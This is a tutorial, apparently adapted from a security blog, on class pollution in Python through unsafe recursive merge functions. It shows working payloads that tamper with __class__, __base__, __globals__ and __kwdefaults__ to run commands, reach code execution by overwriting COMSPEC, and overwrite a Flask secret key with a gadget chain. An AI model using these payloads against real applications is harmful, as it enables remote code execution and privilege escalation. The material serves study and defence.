# Python Class Pollution

Original source: https://blog.abdulrah33m.com/prototype-pollution-in-python/

## Introduction

In [Python](../Dev,%20scripting%20&%20OS/Python.md), we don’t have Prototypes but we have **special attributes**.  It’s possible to update objects of mutable types to define or overwrite their attributes and methods at runtime. Attributes and methods can be defined on a specific object to be accessible by that instance only (non-static) or defined on a class so that all objects of that class can access it (static).

We can apply the same concept of [Prototype Pollution](Prototype%20Pollution.md) but this time in Python by leveraging the special **attributes** that all objects have.

```python
class Employee: pass # Creating an empty class

emp = Employee()
another_emp = Employee()

Employee.name = 'No one' # Defining an attribute for the Employee class
print(emp.name)

emp.name = 'Employee 1' # Defining an attribute for an object (overriding the class attribute)
print(emp.name)

emp.say_hi = lambda: 'Hi there!' # Defining a method for an object
print(emp.say_hi())

Employee.say_bye = lambda s: 'Bye!' # Defining a method for the Employee class
print(emp.say_bye())

Employee.say_bye = lambda s: 'Bye bye!' # Overwriting a method of the Employee class
print(another_emp.say_bye())

#> No one
#> Employee 1
#> Hi there!
#> Bye!
#> Bye bye!
```

From an attacker’s perspective, we are interested more in attributes that we can override/overwrite to be able to exploit this vulnerability rather than the magic methods. Input will always be treated as data (str, int, etc..) and not actual code to be evaluated. If we try to overwrite any of the magic methods, it will lead to crashing the application. 
>[!example] Overwriting `str` with a string value
>`__str()__ => TypeError: 'str' object is not callable`

Let’s try to overwrite `__class__` [^class], the attribute that points to the class that the object is an instance of: 

[^class]: [`__class__`](../Dev,%20scripting%20&%20OS/Python.md#`__class__`)

```python
class Employee: pass # Creating an empty class

emp = Employee()
emp.__class__ = 'Polluted'

#> Traceback (most recent call last):
#>   File "<stdin>", line 1, in <module>
#> TypeError: __class__ must be set to a class, not 'str' object
```

It shows that `__class__` must be set to another class and not a string. This means that it was trying to overwrite that special attribute with what we provided, the only issue is the datatype of the value we are trying to set `__class__` to. Let’s try to set another attribute that accepts strings, like `__qualname__` [^attributes].

[^attributes]: [`__class__` attributes](../Dev,%20scripting%20&%20OS/Python.md#`__class__`%20attributes)

```python
class Employee: pass # Creating an empty class

emp = Employee()
emp.__class__.__qualname__ = 'Polluted'

print(emp)
print(Employee)

#> <__main__.Polluted object at 0x0000024765C48250>
#> <class '__main__.Polluted'>
```

## Examples

A real-life vulnerability could be a recursive merge function. It can exist in various ways and implementations and might be used to accomplish different tasks, such as merging two or more objects, using JSON to set an object’s attributes, etc. The key functionality to look for is a function that gets untrusted input that we control and use it to set attributes of an object recursively. Finding such a function would be enough for exploiting the vulnerability.

In the code below, we have a merge function that takes an instance `emp` of the empty `Employee` class and employee’s info `emp_info` which is a dictionary (similar to JSON) that we control as an attacker. The merge function will read keys and values from the `emp_info` dictionary and set them on the given object `emp`.

```python
class Employee: pass # Creating an empty class

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

emp_info = {
    "name":"Ahemd",
    "age": 23,
    "manager":{
        "name":"Sarah"
        }
    }

emp = Employee()
print(vars(emp))

merge(emp_info, emp)

print(vars(emp))
print(f'Name: {emp.name}, age: {emp.age}, manager name: {emp.manager.get("name")}')

#> {}
#> {'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
#> Name: Ahemd, age: 23, manager name: Sarah
```

### Pollution using `__class__`

Polluting `__qualname__` of `Employee` class via `emp.__class__.__qualname__`:
```python
emp_info = {
    "name":"Ahemd",
    "age": 23,
    "manager":{
            "name":"Sarah"
        },
    "__class__":{
            "__qualname__":"Polluted"
        }
    }

emp = Employee()
merge(emp_info, emp)
print(vars(emp))
print(emp)
print(emp.__class__.__qualname__)
print(Employee)
print(Employee.__qualname__)
#> {'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
#> <__main__.Polluted object at 0x000001F80B20F5D0>
#> Polluted
#> <class '__main__.Polluted'>
#> Polluted
```

### Pollution using `__base__`

Polluting `Employee` class via `__base__` [^attributes] :

```python
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class

def merge(src, dst):
...

emp_info = {
    "__class__":{
        "__base__":{
            "__qualname__":"Polluted"
            }
        }
    }

hr_emp = HR()
merge(emp_info, hr_emp)
print(HR)
print(Employee)
#> <class '__main__.HR'>
#> <class '__main__.Polluted'>
```

The same approach can be followed if we want to pollute any parent class (that isn’t one of the immutable types) in the inheritance chain, by chaining `__base__` together such as `__base__.__base__`, `__base__.__base__.__base__` and so on.

>[!warning]
>We can't modify classes of **immutable types**, such as `object`, `str`, `int`, `dict`, etc.

```python
from os import popen

class Employee: pass # Creating an empty class

class HR(Employee): pass # Class inherits from Employee class

class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
    def execute_command(self):
        command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
        return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


emp_info = {
    "__class__":{
        "__base__":{
            "__base__":{
                "custom_command": "whoami"
            }
        }
    }
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
merge(emp_info, recruiter_emp)
print(system_admin_emp.execute_command())

#> [!] Executing: "echo Hello there", output: "Hello there"
#> [!] Executing: "whoami", output: "abdulrah33m"
```

### Pollution using `__globals__`
`__globals__` is a dictionary object that gives us access to the global scope of a function which allows us to access defined variables, imported modules, etc.
`__globals__` attribute is accessible from any of the **defined** methods of the instance we control, such as `__init__`.

We cannot use built-in methods inherited from the `object` class, such as `__str__` unless they were overridden.

>[!Warning]
>Keep in mind that `<instance>.__init__`, `<instance>.__class__.__init__` and `<class>.__init__` are all the same and point to the same class constructor.

In the example below, we leveraged the special attribute `__globals__` to access and set an attribute of `NotAccessibleClass` class, and modify the global variable `not_accessible_variable`. `NotAccessibleClass` and `not_accessible_variable` wouldn’t be accessible without `__globals__` since the class isn’t a parent class of the instance we control and the variable isn’t an attribute of the class we control.

```python
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class User:
    def __init__(self):
        pass

class NotAccessibleClass: pass
not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable)
print(NotAccessibleClass)

#> Polluted variable
#> <class '__main__.PollutedClass'>
```

This technique can be used to overwrite default variable values and eventually obtain RCE:
```python
import subprocess, json

class Employee:
    def __init__(self):
        pass

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```

### Polluting `__kwdefaults__`

**`__kwdefaults__`** is a special attribute of all functions, based on Python [documentation](https://docs.python.org/3/library/inspect.html), it is a “mapping of any default values for **keyword-only** parameters”. Polluting this attribute allows us to control the default values of keyword-only parameters of a function, these are the function’s parameters that come after * or *args.

```python
from os import system
import json

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class Employee:
    def __init__(self):
        pass

def execute(*, command='whoami'):
    print(f'Executing {command}')
    system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```

## Polluting Flask secret across files

So, if you can do a class pollution over an object defined in the main python file of the web but **whose class is defined in a different file** than the main one. Because in order to access __globals__ in the previous payloads you need to access the class of the object or methods of the class, you will be able to **access the globals in that file, but not in the main one**.

You **won't be able to access the Flask app global object** that defined the **secret key** in the main page:
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```

In this scenario you need a gadget to traverse files to get to the main one to access the global object app.secret_key to change the Flask secret key and be able to escalate privileges knowing this key.

You can use a payload like this one [^IDEK] :

[^IDEK]: https://ctftime.org/writeup/36082
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```